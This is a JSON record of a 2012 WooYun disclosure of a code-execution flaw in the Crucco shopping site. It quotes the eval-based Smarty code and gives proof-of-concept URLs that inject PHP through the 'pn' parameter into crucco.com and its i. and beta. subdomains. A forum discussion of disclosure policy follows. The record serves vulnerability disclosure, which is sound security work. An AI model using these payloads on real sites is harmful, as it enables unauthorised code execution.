{"id": 16084, "wybug_id": "wooyun-2012-015124", "wybug_title": "初刻Crucco主站任意代码执行", "wybug_corp": "初刻Crucco", "wybug_author": "kelon", "wybug_date": "2012-11-22 16:28", "wybug_open_date": "2012-11-27 16:29", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["代码执行", "黑盒", "黑盒分析技巧", "代码执行漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-11-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-11-27：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 初刻用的是ecshop，但是程序员二次开发中太过随意，导致问题产生。。。 详细说明：  http://www.crucco.com/huodongye.php?pn=zucefangsi在这里我们发现pn的值没有指定，可以任意提交，我们推断应该程序员写成以下代码\n$smarty->display($_GET['p']);\n我们找到ecshop中的 display方法 发现里面用了eval\nfunction _eval($content)    {        ob_start();        eval('?' . '>' . trim($content));        $content = ob_get_contents();        ob_end_clean();        return $content;    }\n   漏洞证明：  我们提交以下url:http://www.crucco.com/huodongye.php?pn=str:%3C?php%20phpinfo%28%29;//会发现可爱的phpinfo出来了\n\n   修复方案：  指定pn的值   版权声明：转载请注明来源 kelon@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2012-11-27 16:29 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-11-22 16:29 |    \t\tBlack Angel \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:35        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  沙发先坐下。再围观。    \n     2012-11-22 16:30 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  我日    \n     2012-11-22 16:30 |    \t\tkelon \t\t\t( 实习白帽子  |\t\t\t        Rank:73 漏洞数:9        )\t\t \n  @xsser 秒过？估计要忽略了    \n     2012-11-22 16:31 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @kelon 不是，你目前信誉比较高，乌云的审核都是通过人提交的漏洞来进行的    \n     2012-11-22 16:37 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  @xsser 有时候秒过有时候就要等审核，相同类型的漏洞，用什么机制判断的，不会是忽略数吧，那不科学    \n     2012-11-22 16:40 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @小胖胖要减肥 我们采取的是智能高科技的纳米云判断技术    \n     2012-11-22 16:43 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  @xsser 你们是不是还能修核潜艇啊，反正我好像一直rp不错，看看这个 WooYun: 乐视网漏洞合集 ，考虑下放宽到10天吧，我提的好几个都是厂商没有看到 ，之前麦考林也是，新蛋的联系你了么    \n     2012-11-22 22:13 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  我会告诉你们，乌云是通过关键字判断审核的嘛 - -#    \n     2012-11-23 10:59 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  @zzR 好智能~~~    \n     2012-11-23 11:10 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  @zzR @se55i0n zzr骗你的 只要成为剑心的基友保证秒过    \n     2012-11-23 11:26 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  @小胖胖要减肥 这么说你的菊花已经献给剑心了—_—    \n     2012-11-23 11:54 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  我都没多少秒过的 都是靠人品的    \n     2012-11-27 17:05 |    \t\tpopok \t\t\t( 普通白帽子  |\t\t\t        Rank:117 漏洞数:24        | nothing)\t\t \n  @xsser这样就公布TM是要大家都去脱裤么？真心无力吐槽wooyun的审核机制了，坑爹的一B啊    \n     2012-11-27 17:08 |    \t\tkelon \t\t\t( 实习白帽子  |\t\t\t        Rank:73 漏洞数:9        )\t\t \n  @xsser 这个到时不会找我吧。。这么快就公开了？    \n     2012-11-27 17:08 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  @popok 对于这种不重视安全的厂家，需要一记狠狠的耳光才能打醒~怎么能怪wooyun呢，wooyun也有自己的准则~    \n     2012-11-27 17:12 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  @初刻Crucco 公开了，就知道修复了哇~    \n     2012-11-27 17:16 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  确实已经修复了，应该是看到提交的漏洞了，处理后没在平台走确认流程而已。    \n     2012-11-27 17:17 |    \t\t初刻Crucco(乌云厂商)\t\t \n  已经修复了 谢谢@kelon    \n     2012-11-27 17:18 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @kelon @se55i0n @初刻Crucco 这个我们单独联系了厂商，因为交接问题导致的    \n     2012-11-27 17:21 |    \t\tkelon \t\t\t( 实习白帽子  |\t\t\t        Rank:73 漏洞数:9        )\t\t \n  @xsser，可怜我的RANK    \n     2012-11-27 17:22 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  @疯狗 难道厂商不应该确认漏洞的同时，认可白帽子的的贡献么；漏洞信息没有得到确认而公开，要是没及时修复这是对自身安全的不负责；而且白帽子提交了漏洞信息却惨遭忽略，不光是rank不rank的问题~说严重点也是一种心理伤害~    \n     2012-11-27 17:28 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @se55i0n 说的在理，但是有点过了，并不是厂商的全体现状，而是由于极少数厂商对平台使用的理解存在盲区所导致，相信这次过后 @初刻Crucco 厂商不会在漏掉白帽子的漏洞了 ：）另外“惨遭忽略”这种问题，还有一种可能，就是厂商从自身机制考虑，可能某些漏洞影响确实不大所导致，这种问题严重的乌云会帮白帽维权，你应该也看到过，我们就事论事。    \n     2012-11-27 17:30 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @se55i0n 厂商漏给的rank，乌云会在第二次的审核中给大家补上，也是一些白帽问为什么rank会有变动的原因，好漏洞会给rank，厂商乱给的也会进行人工修正。    \n     2012-11-27 19:35 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  @popok @xsser 可以先延长到10天把 太多例子了    \n     2012-11-27 19:35 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  @se55i0n 这个是xsser自己定的规则，注册厂商5天不认领漏洞自动公开    \n     2012-11-27 20:03 |    \t\tkrbl \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:13        | ♦♠♣♫♪☼☻☺ஐ♥♀♂☆๑۩۞۩๑☜☞...)\t\t \n  @初刻Crucco,@xsser,@@kelon,@小胖胖要减肥 ....谁说已经修复了？不是还存在？http://i.crucco.com/huodongye.php?pn=str:%3C?php%20phpinfo%28%29;//    \n     2012-11-27 20:05 |    \t\tkrbl \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:13        | ♦♠♣♫♪☼☻☺ஐ♥♀♂☆๑۩۞۩๑☜☞...)\t\t \n  还有。。http://beta.crucco.com/huodongye.php?pn=str:%3C?php%20phpinfo%28%29;//    \n     2012-11-27 20:09 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  @krbl 厂商那个回复是wooyun自动回复的，然后自动公开，这块现在就是这个样子，老问题了    \n     2012-11-27 21:18 |    \t\tkelon \t\t\t( 实习白帽子  |\t\t\t        Rank:73 漏洞数:9        )\t\t \n  @krbl 我是随便看到，顺手提交的，看起来是开发用的站点。@初刻Crucco 厂商应该好好查查。    \n     2012-11-27 21:37 |    \t\tkrbl \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:13        | ♦♠♣♫♪☼☻☺ஐ♥♀♂☆๑۩۞۩๑☜☞...)\t\t \n  @ kelon是啊    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}